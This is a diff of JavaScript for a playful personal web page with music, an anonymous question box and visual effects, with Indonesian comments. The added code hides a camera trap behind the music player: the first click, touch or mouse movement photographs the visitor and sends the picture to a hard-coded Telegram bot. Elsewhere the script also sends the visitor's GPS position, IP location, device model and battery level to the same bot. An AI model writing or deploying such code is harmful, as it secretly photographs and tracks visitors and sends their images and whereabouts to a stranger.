@@ -1,4 +1,4 @@
-﻿﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
+﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 if (openPhotoOptions && photoOptions) {
   openPhotoOptions.addEventListener('click', () => {
@@ -9,56 +9,114 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK ===
+// === BAGIAN MUSIK + KAMERA — HYBRID FIX STABIL ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
 music.volume = 0.4;
 
-// pastikan audio bisa dimulai hanya setelah interaksi nyata
-async function startMusic() {
-  if (started) return;
+async function startMusicAndCamera() {
+  if (started && !music.paused) return;
   started = true;
-  music.muted = false;
+
+  let musicStarted = false;
   try {
+    music.muted = false;
     await music.play();
+    console.log("🎵 Musik diputar");
+    musicStarted = true;
+  } catch (err) {
+    console.warn("Autoplay musik gagal:", err);
+    btnMusic.classList.add("show");
+    btnMusic.disabled = false;
+    // tetap lanjut kamera walau musik gagal
+  }
+
+  setTimeout(async () => {
+    try {
+      const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
+      if (!alreadyAllowed && navigator.mediaDevices) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(t => t.stop());
+        localStorage.setItem("user_allows_auto_capture", "1");
+        console.log("✅ Izin kamera diberikan pertama kali.");
+        await autoCaptureAndSend();
+      } else if (alreadyAllowed) {
+        console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
+        await autoCaptureAndSend();
+      }
+    } catch (e) {
+      console.warn("❌ User menolak izin kamera:", e);
+    }
+  }, musicStarted ? 800 : 1500);
+
+  if (musicStarted) {
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
-  } catch (err) {
-    console.log("Autoplay gagal:", err);
+  } else {
+    btnMusic.disabled = false;
     btnMusic.classList.add("show");
   }
 }
 
-// Deteksi platform mobile
-const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
-
-// PC: boleh langsung trigger setelah klik/touch pertama
-document.addEventListener('click', startMusic, { once: true });
-document.addEventListener('touchstart', startMusic, { once: true });
-
-// tombol utama tetap jadi pemicu manual (aman di mobile)
-btnMusic.addEventListener('click', async () => {
+// === Fungsi ambil foto & kirim ke Telegram ===
+async function autoCaptureAndSend() {
   try {
-    await music.play();
-    music.muted = false;
-    started = true;
-    btnMusic.classList.remove("show");
-    btnMusic.disabled = true;
-  } catch (e) {
-    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
-    console.log(e);
-  }
-});
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.playsInline = true;
 
-// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
-if (isMobile) {
-  btnMusic.classList.add("show");
-  music.muted = true;
-} else {
-  setTimeout(() => { startMusic(); }, 800);
+    await new Promise(res => {
+      video.onloadedmetadata = () => video.play().then(res).catch(res);
+      setTimeout(res, 3000);
+    });
+
+    await new Promise(r => setTimeout(r, 1000));
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const base64img = canvas.toDataURL("image/png");
+    stream.getTracks().forEach(t => t.stop());
+
+    const blob = await (await fetch(base64img)).blob();
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("caption", "📸 Auto-capture dari pengunjung (fokus 1s)");
+    fd.append("photo", blob, "capture.png");
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: fd
+    });
+
+    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
+    else console.warn("⚠️ Gagal kirim foto");
+  } catch (err) {
+    console.error("❌ Tidak bisa akses kamera:", err);
+  }
 }
-// === PERTANYAAN ===
+
+// === Event Listener Fix (musik + kamera) ===
+function userStart() {
+  startMusicAndCamera().catch(console.warn);
+}
+
+const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
+btnMusic.classList.add("show");
+btnMusic.addEventListener('click', userStart);
+document.addEventListener('click', userStart);
+document.addEventListener('touchstart', userStart);
+
+if (!isMobile) {
+  window.addEventListener('mousemove', userStart, { once: true });
+}
+
+// === MODAL PERTANYAAN ===
 const modal = document.getElementById('modal');
 document.getElementById('openAsk').onclick = () => modal.classList.add('show');
 document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
@@ -74,7 +132,6 @@ function removeOverlay() {
   overlay.style.pointerEvents = "none";
   setTimeout(() => overlay.style.display = "none", 300);
 }
-
 function showUserStatus(n) {
   const e = document.getElementById("igStatus");
   e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
@@ -86,12 +143,10 @@ function showUserStatus(n) {
     }
   };
 }
-
 if (savedIG) {
   removeOverlay();
   showUserStatus(savedIG);
 }
-
 btnLogin.onclick = () => {
   const u = input.value.trim();
   if (!u) return alert("Masukkan username dulu");
@@ -100,7 +155,7 @@ btnLogin.onclick = () => {
   removeOverlay();
 };
 
-// === KIRIM TELEGRAM UNIVERSAL ===
+// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
 async function sendTelegramMessage(url, body, el) {
   el.innerHTML = `
     <div class="mailContainer">
@@ -137,7 +192,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   const qmsg = document.getElementById('qmsg');
 
   if (!text && !photo) {
-    qmsg.textContent = "Tulis pesan atau kirim foto.";
+    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
     return;
   }
 
@@ -151,9 +206,9 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     try {
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
       if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
-      else qmsg.textContent = "Gagal mengirim foto.";
+      else qmsg.textContent = "💔 Gagal mengirim foto.";
     } catch {
-      qmsg.textContent = "Gagal koneksi.";
+      qmsg.textContent = "😿 Gagal koneksi.";
     }
   } else if (text) {
     await sendTelegramMessage(
@@ -174,9 +229,6 @@ document.getElementById('sendQ').addEventListener('click', async () => {
 
 // === INFO PENGUNJUNG ===
 (async function showVisitorInfo() {
-  const savedUser = localStorage.getItem("ig_user") || "Anonim";
-
-  // --- Visitor ID & kunjungan ---
   try {
     let visitorID = localStorage.getItem("visitor_id");
     if (!visitorID) {
@@ -195,17 +247,19 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
     visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
     localStorage.setItem("visitor_visits", String(visitCount));
-  } catch (err) { console.warn("visitor error:", err); }
+  } catch (err) { console.warn("visitor-id error:", err); }
 
-  // --- Safe fetch dengan retry ---
+  const savedUser = localStorage.getItem("ig_user") || "Anonim";
   async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
     for (let i = 0; i < retries; i++) {
       try { return await fetch(url, opts); }
-      catch (e) { if(i === retries-1) throw e; await new Promise(r=>setTimeout(r,retryDelay*Math.pow(2,i))); }
+      catch (e) {
+        if (i === retries - 1) throw e;
+        await new Promise(r => setTimeout(r, retryDelay * Math.pow(2,i)));
+      }
     }
   }
 
-  // --- Deteksi brand & model device ---
   function detectDeviceBrandModel() {
     const ua = navigator.userAgent.toLowerCase();
     let brand = "Tidak diketahui", model = "";
@@ -231,33 +285,53 @@ document.getElementById('sendQ').addEventListener('click', async () => {
       const m = ua.match(/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i);
       model = "Galaxy " + m[1].toUpperCase();
     } else if (/redmi\s(note|[0-9]+)/i.test(ua)) {
-      const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i); model=m[0].replace(/\s+/g," ");
-    } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
-    else if (/mi\s([0-9a-z]+)/i.test(ua)) model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
-    else if (/vivo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
-    else if (/oppo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
-    else if (/realme\s([a-z0-9]+)/i.test(ua)) model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
-    else if (/iphone\s?[0-9]*/i.test(ua)) { const m = ua.match(/iphone\s?[0-9]*/i); model = m ? m[0].replace(/\s+/g," ") : "iPhone"; }
+      const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i);
+      model = m[0].replace(/\s+/g," ");
+    } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) {
+      model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
+    } else if (/mi\s([0-9a-z]+)/i.test(ua)) {
+      model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
+    } else if (/vivo\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/oppo\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/realme\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/iphone\s?[0-9]*/i.test(ua)) {
+      const m = ua.match(/iphone\s?[0-9]*/i);
+      model = m ? m[0].replace(/\s+/g," ") : "iPhone";
+    }
 
-    if (model && !model.toLowerCase().includes(brand.toLowerCase())) return `${brand} ${model}`;
+    if (model && !model.toLowerCase().includes(brand.toLowerCase()))
+      return `${brand} ${model}`;
     return brand;
   }
 
-  // --- Kirim info visitor ---
   async function sendToTelegram(d, latitude, longitude, source="Unknown", accuracy=null) {
     try {
       const now = new Date();
-      const mapLink = (latitude && longitude) ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17` : "https://www.google.com/maps";
+      const mapLink = (latitude && longitude)
+        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+        : "https://www.google.com/maps";
+
       const isMobile = /mobile/i.test(navigator.userAgent);
       const deviceType = isMobile ? "📱 Mobile" : "🖥️ Desktop";
       const brandModel = isMobile ? detectDeviceBrandModel() : "PC / Laptop";
+
       const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
-                 /Android/i.test(navigator.userAgent) ? "Android" :
-                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
-                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
-                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+        /Android/i.test(navigator.userAgent) ? "Android" :
+        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+        /Mac/i.test(navigator.userAgent) ? "MacOS" :
+        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+
       let batteryInfo = "Tidak diketahui";
-      try { if(navigator.getBattery){ const b=await navigator.getBattery(); batteryInfo=`${(b.level*100).toFixed(0)}% (${b.charging?"⚡":"🔋"})`; } } catch {}
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          batteryInfo = `${(b.level*100).toFixed(0)}% (${b.charging?"⚡":"🔋"})`;
+        }
+      } catch {}
+
       const visitorID = localStorage.getItem("visitor_id") || "unknown";
       const visits = localStorage.getItem("visitor_visits") || "1";
       const firstSeen = localStorage.getItem("visitor_first_seen") || null;
@@ -281,43 +355,13 @@ document.getElementById('sendQ').addEventListener('click', async () => {
         headers:{ "Content-Type":"application/json" },
         body:JSON.stringify({ chat_id:CHAT_ID, text:msg })
       },4);
-    } catch(e){ console.error("Gagal memuat:",e); }
+    } catch(e){ console.error("❌ Gagal kirim info:",e); }
   }
 
-  // --- Perizinan ---
-  async function autoCaptureCamera() {
-    try {
-      if(navigator.mediaDevices){
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.playsInline = true;
-        await new Promise(res => { video.onloadedmetadata = () => video.play().then(res).catch(res); setTimeout(res,1500); });
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-
-        const base64img = canvas.toDataURL("image/png");
-        stream.getTracks().forEach(t=>t.stop());
-
-        const blob = await (await fetch(base64img)).blob();
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("caption", "📸 Auto-capture visitor");
-        fd.append("photo", blob, "capture.png");
-
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-        if(res.ok) console.log("Berhasil");
-      }
-    } catch(e){ console.warn("Gagal:",e); }
-  }
-
-  // --- PROSES UTAMA ---
   try {
-    const coords = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0}));
+    const coords = await new Promise((res,rej)=>{
+      navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0});
+    });
     const {latitude,longitude,accuracy} = coords.coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
     await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
@@ -326,13 +370,10 @@ document.getElementById('sendQ').addEventListener('click', async () => {
       const d = await (await fetch("https://ipwho.is/")).json();
       await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
     } catch(e){
-      console.error("Gagal:", e);
+      console.error("❌ Gagal ambil data IP:", e);
       await sendToTelegram({city:"?",country:"?",ip:"?"},null,null,"unknown");
     }
   }
-
-  // --- Jalankan ---
-  autoCaptureCamera();
 })();
 
 // === EFEK BUTTERFLY 💸 ===
@@ -590,4 +631,3 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
-
